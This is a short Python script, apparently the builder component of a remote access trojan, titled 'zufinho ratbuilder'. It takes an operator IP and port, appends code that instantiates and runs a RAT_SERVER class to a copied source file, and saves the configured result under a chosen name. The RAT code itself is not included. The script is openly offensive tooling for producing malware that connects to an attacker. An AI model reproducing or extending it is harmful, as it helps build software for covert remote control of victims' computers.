import os
import time
if not os.name=="nt":
    print("working only at windows")
    time.sleep(3)
    exit()
os.system("title zufinho ratbuilder - server")
name=input("Name of server:")
ip=input("IP:")
port=int(input("Port:"))
os.system("md temp")
os.system("copy src\server.py temp\server.py")
server=open(f"temp\server.py","a")
servercontent=f"""
rat = RAT_SERVER('{ip}', {port})

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()
    """
server.write(servercontent)
server.close()
os.system(f"copy temp\server.py {name}.py")
os.system("rd /q /s temp")
